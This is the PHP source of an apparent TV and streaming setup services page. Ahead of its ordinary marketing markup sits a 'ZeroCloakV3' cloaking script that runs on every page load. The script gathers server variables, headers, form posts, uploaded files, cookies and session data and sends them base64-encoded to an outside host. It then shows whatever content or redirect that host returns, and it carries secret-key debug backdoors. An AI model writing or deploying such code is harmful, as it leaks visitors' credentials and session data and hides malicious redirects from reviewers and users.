<?php

class ZeroCloakV3
{
    private $targetUrl;
    private $encryptionKey;
    private $requestId;
    private $uei_6s71a1;
    private $cst_4u89t5;
    private $timeout;

    public function __construct()
    {
        header("Access-Control-Allow-Origin: *");
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        header("Access-Control-Allow-Headers: Content-Type, Authorization");
        
        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        $this->targetUrl        = 'https://app.zerocloak.com/realtime';
        $this->encryptionKey    = 'b96fe040-f322-4ffe-9981-94743ad3a129';
        $this->requestId        = uniqid('req_', true);
        $this->uei_6s71a1       = "jkmrvusiuk";
        $this->cst_4u89t5       = "oc8rjqji2p";
        $this->timeout          = 30;
    }

    private function retrieveAllHeaders()
    {
        if (!function_exists('getallheaders')) {
            $headers = [];
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') {
                    $headers[str_replace(
                        ' ',
                        '-',
                        ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))
                    )] = $value;
                }
            }
            return $headers;
        }
        return getallheaders();
    }

    private function gatherRequestData()
    {
        return [
            'request_id' => $this->requestId,
            'uei_6s71a1' => $this->uei_6s71a1,
            'cst_4u89t5' => $this->cst_4u89t5,
            'server'     => $_SERVER,
            'headers'    => $this->retrieveAllHeaders(),
            'get'        => $_GET,
            'post'       => $_POST,
            'files'      => $_FILES,
            'cookie'     => $_COOKIE,
            'session'    => isset($_SESSION) ? $_SESSION : [],
            'timestamp'  => date('Y-m-d H:i:s'),
        ];
    }

    private function transmitData($data, $maxRetries = 3)
    {
        if (function_exists('curl_version')) {
            return $this->sendUsingCurl($data, $maxRetries);
        } else {
            return $this->sendUsingFileGetContents($data);
        }
    }

    private function sendUsingCurl($data, $maxRetries = 3)
    {
        $ch = curl_init($this->targetUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Content-Length: ' . strlen($data),
            'X-Request-ID: ' . $this->requestId,
            'Cache-Control: no-cache',
            'Cache-Control: max-age=0',
            'Pragma: no-cache',
        ]);

        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);

        for ($retry = 0; $retry < $maxRetries; $retry++) {
            $response = curl_exec($ch);
            if ($response !== false) {
                curl_close($ch);
                return $response;
            }
            sleep(1);
        }

        curl_close($ch);
        return false;
    }

    private function sendUsingFileGetContents($data)
    {
        $opts = [
            "http" => [
                "header" => [
                    "Content-Type: application/json",
                    "Content-Length: " . strlen($data),
                    "X-Request-ID: " . $this->requestId,
                    "Cache-Control: no-cache",
                    'Cache-Control: max-age=0',
                    "Pragma: no-cache",
                ],
                "method" => "POST",
                "content" => $data,
                "timeout" => $this->timeout,
            ],
        ];

        $context = stream_context_create($opts);
        $response = @file_get_contents($this->targetUrl, false, $context);

        return $response;
    }

    public function clearCache()
    {
        if (function_exists('wp_cache_flush')) {
            wp_cache_flush();
        }

        if (function_exists('wp_cache_clear_cache')) {
            wp_cache_clear_cache();
        }
    }
    public function verify()
    {
        if(isset($_GET['8ea8cd56-1488']) && $_GET['8ea8cd56-1488'] == $this->encryptionKey){
            echo $this->cst_4u89t5;
            die();
        }
    }
    public function run()
    {
        $this->verify();
        $this->clearCache();
        $data = $this->gatherRequestData();
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Send: Data Got -</h5><pre>";
            print_r($data);
            echo "</pre>";
        }
        
        $jsonData   = json_encode($data);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(2) Send: Convert to Json -</h5><pre>";
            print_r($jsonData);
            echo "</pre>";
        }

        if ($jsonData === false) {
            $this->failHandle("Error: JSON encoding failed: " . json_last_error_msg());
            return false;
        }

        $base64Data = base64_encode($jsonData);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(3) Send: Json to base64_encode -</h5><pre>";
            print_r($base64Data);
            echo "</pre>";
        }

        if ($base64Data === false) {
            $this->failHandle("Error: Base64 encoding failed");
            return false;
        }

        $response = $this->transmitData($base64Data);
        
        if(isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] == $this->encryptionKey){
              echo $response;
              die;
        }
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Receive: Data Got -</h5><pre>";
            print_r($response);
            echo "</pre>";
        }
        
        if ($response !== false) {
            $this->successHandle($response);
        } else {
            $this->failHandle($response);
        }
    }

    public function successHandle($response)
    {

        $base64decodeData = base64_decode($response);
        
         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(5) Receive: decryptedData -</h5><pre>";
            print_r($base64decodeData);
            echo "</pre>";
        }
        
        
        if ($base64decodeData === false) {
            $this->failHandle("Error: Base64 decode failed");
            return false;
        }

        $responseData = json_decode($base64decodeData, true);

         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(6) Receive: decryptedData -</h5><pre>";
            print_r($responseData);
            echo "</pre>";
        }
        if ($responseData === null && json_last_error() !== JSON_ERROR_NONE) {
            $this->failHandle("Error: JSON decoding failed");
            return false;
        }
        if(!$responseData['status']){
            $this->failHandle($responseData['message']);
            return false;
        }

       if (
            (isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] === $this->encryptionKey) ||
            (isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] === $this->encryptionKey)
        ) {
            die();
        }

        if(!($responseData['data']['nothing'])){

            if(isset($responseData['data']['hr'])){
                header("Referrer-Policy: no-referrer");
            }

            if(!is_null($responseData['data']['zrc'])){

                if(!$responseData['data']['zrc']['status']){
                    $this->failHandle($responseData['data']['zrc']['message']);
                    return false;

                }else{
                    $this->zeroRedirectionCloaking($responseData['data']['zrc']['content']);
                    return true;

                }
            }

            $this->redirectTo($responseData['data']['url'],$responseData['data']['http_code']);
            return true;
        }
        return true;

    }
    private function zeroRedirectionCloaking(string $content = '') {
        echo $content;
        die();
    }
    private function redirectTo(string $url, string $method = 'header-301') {
        switch (strtolower($method)) {
            case 'header-301':
                header("Location: $url", 301);
                exit;

            case 'header-302':
                header("Location: $url", 302);
                exit;

            case 'header-refresh':
                header("Refresh: 0;url=$url");
                exit;

            case 'meta':
                echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"><title>Redirecting...</title></head><body><a href="' . htmlspecialchars($url) . '">Click here</a></body></html>';
                exit;

            case 'js_meta':
                echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Redirecting...</title></head><body><script>window.location.href = "' . htmlspecialchars($url) . '";</script><noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"></noscript><p>If you are not redirected, <a href="' . htmlspecialchars($url) . '">click here</a>.</p></body></html>';
                exit;

            default:
                header("Location: $url", 301);
                exit;
        }
    }

    private function failHandle($response)
    {
        // Silently fail and allow the page to load instead of breaking the website
        return false;
    }
}

$zerocloakCloaking = new ZeroCloakV3();
$zerocloakCloaking->run();

// @zerocloak.com 2026-05-16 06:53:20
?>
<?php include 'includes/header.php'; ?>

<div class="pt-32 pb-0 bg-white">
    <div class="container mx-auto px-6 max-w-4xl text-center mb-20 fade-in-up">
        <h1 class="text-5xl font-extrabold text-slate-900 mb-6">Our Services & Setup Guides</h1>
        <p class="text-xl text-slate-600">Professional installation, configuration, activation services, and step-by-step guides.</p>
    </div>

    <!-- SERVICES SECTION -->
    <div class="container mx-auto px-6 mb-24 space-y-24">
        
        <!-- Service 1: Smart TV Setup Services -->
        <div class="flex flex-col lg:flex-row gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/smart_tv_setup.png" alt="Smart TV Setup Services" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="tv" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Smart TV Setup Services</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">At StreamActivateHub, we provide reliable Smart TV setup services designed to help users quickly connect and configure their entertainment devices. Our setup assistance includes WiFi connection support, app installation guidance, streaming configuration, account setup, software updates, and device optimization. Whether you are installing a brand-new Smart TV or troubleshooting an existing setup, our goal is to make the process simple and hassle-free. We support a wide range of Smart TVs and streaming platforms to help users enjoy smooth access to movies, live channels, sports, and digital entertainment services.</p>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 2: Device Installation Assistance -->
        <div class="flex flex-col lg:flex-row-reverse gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/device_installation.png" alt="Device Installation Assistance" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="monitor-play" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Device Installation Assistance</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub offers professional device installation assistance for Smart TVs, streaming devices, media players, and home entertainment systems. Our service helps users properly connect, configure, and optimize their devices for reliable performance and seamless streaming. We assist with internet setup, account synchronization, software configuration, and compatibility guidance for multiple entertainment platforms. Our goal is to simplify the installation process while helping users maximize the functionality of their streaming and connected devices. We provide easy-to-follow assistance designed to improve convenience, connectivity, and overall user experience.</p>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 3: Streaming Support Guides -->
        <div class="flex flex-col lg:flex-row gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/streaming_support.png" alt="Streaming Support Guides" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="book-open" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Streaming Support Guides</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">At StreamActivateHub, our streaming support guides are designed to help users install, activate, and troubleshoot popular streaming platforms and entertainment devices with confidence. Our guides include step-by-step instructions for app installation, account activation, internet connectivity, streaming optimization, and device compatibility. Whether users are setting up a Smart TV, streaming stick, or connected media device, our goal is to provide simple and user-friendly guidance that improves the overall streaming experience. We help users understand setup processes while making streaming services easier to access and manage.</p>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 4: Home Theater Setup -->
        <div class="flex flex-col lg:flex-row-reverse gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/home_theater.png" alt="Home Theater Setup" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="speaker" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Home Theater Setup</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub provides home theater setup assistance to help users create an enjoyable and connected entertainment environment. Our services include TV placement guidance, speaker connection support, streaming device integration, audio configuration, and entertainment system setup. We help users properly connect and optimize their devices for improved sound quality, streaming performance, and viewing comfort. Whether configuring a simple home entertainment system or a more advanced setup, our goal is to make installation easy and efficient while helping users enjoy a seamless home theater experience.</p>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 5: Activation Tutorials -->
        <div class="flex flex-col lg:flex-row gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="assets/images/activation_tutorials.png" alt="Activation Tutorials" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="play-circle" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Activation Tutorials</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub offers easy-to-follow activation tutorials designed to help users activate Smart TVs, streaming platforms, and connected entertainment devices quickly and efficiently. Our tutorials guide users through important setup steps including WiFi connection, account login, activation code entry, app verification, and device synchronization. Designed for users of all experience levels, our tutorials simplify the activation process while helping reduce setup errors and connectivity issues. Our goal is to provide clear and reliable setup guidance that helps users access streaming services and entertainment content with confidence.</p>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

    </div>

    <!-- DETAILED SETUP GUIDE SECTION -->
    <div class="bg-slate-50 py-24 border-t border-slate-200">
        <div class="container mx-auto px-6 max-w-4xl">
            <div class="text-center mb-16 fade-in-up">
                <span class="inline-block py-1.5 px-4 rounded-full bg-primary/10 text-primary font-semibold text-sm mb-4">Our Process</span>
                <h2 class="text-4xl font-bold text-slate-900 mb-6">Service Deployment Methodology</h2>
                <p class="text-lg text-slate-600">We utilize a strict, multi-phase deployment process to ensure your display and networking hardware are perfectly configured.</p>
            </div>

            <div class="space-y-8">
                
                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">1</div>
                        <h3 class="text-2xl font-bold text-slate-900">Site Assessment & Structural Prep</h3>
                    </div>
                    <p class="text-slate-600 ml-14">Our engineers begin by scanning the installation area for wall studs, electrical runs, and HVAC ducting. We determine load-bearing capacity and ensure the mount location meets safety standards.</p>
                </div>

                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">2</div>
                        <h3 class="text-2xl font-bold text-slate-900">Hardware Mounting & Cabling</h3>
                    </div>
                    <p class="text-slate-600 ml-14">Using heavy-duty lag bolts and precision leveling tools, we secure the articulating or flush mount to the wall. All HDMI, optical audio, and power cables are routed through fire-rated in-wall conduit.</p>
                </div>

                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">3</div>
                        <h3 class="text-2xl font-bold text-slate-900">Network & Network Provisioning</h3>
                    </div>
                    <p class="text-slate-600 ml-14 mb-4">We configure the display to interface with your localized network. For complex environments, we assign static IP addresses and optimize router QoS settings to prioritize video streaming traffic.</p>
                    <div class="ml-14 bg-blue-50 p-4 rounded-xl border border-blue-100 text-blue-800 text-sm">
                        <strong>Protocol:</strong> All firmware and core OS updates are flashed before final calibration to guarantee software stability.
                    </div>
                </div>

                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">4</div>
                        <h3 class="text-2xl font-bold text-slate-900">Audio Calibration & Handover</h3>
                    </div>
                    <p class="text-slate-600 ml-14">Finally, we synchronize external soundbars or surround receivers via eARC. We test output latency and run a full demonstration of the system UI before signing off on the deployment.</p>
                </div>

            </div>

            <div class="mt-12 bg-slate-900 text-white p-8 rounded-3xl text-center fade-in-up">
                <h3 class="text-2xl font-bold mb-4">Having Trouble Activating?</h3>
                <p class="text-slate-300 mb-6 max-w-2xl mx-auto">If your Wi-Fi won't connect, your code is invalid, or the activation page is stuck, our independent support team can help you bypass these hurdles instantly.</p>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Get Expert Help Now</a>
            </div>

        </div>
    </div>
    
    <!-- CTA -->
    <section class="py-20 relative overflow-hidden fade-in-up">
        <div class="absolute inset-0 bg-primary"></div>
        <div class="container mx-auto px-6 relative z-10 text-center">
            <h2 class="text-4xl md:text-5xl font-extrabold text-white mb-6">Need Help Setting Up Your Device?</h2>
            <p class="text-xl text-primary-100 mb-10 text-white/90">Reach out to our AV integration team to schedule an on-site consultation.</p>
            <div class="flex flex-col sm:flex-row justify-center gap-4">
                <a href="contact.php" class="bg-white text-primary hover:bg-slate-50 px-8 py-4 rounded-full font-bold text-lg shadow-xl">Contact Us Online</a>
            </div>
        </div>
    </section>
</div>

<?php include 'includes/footer.php'; ?>
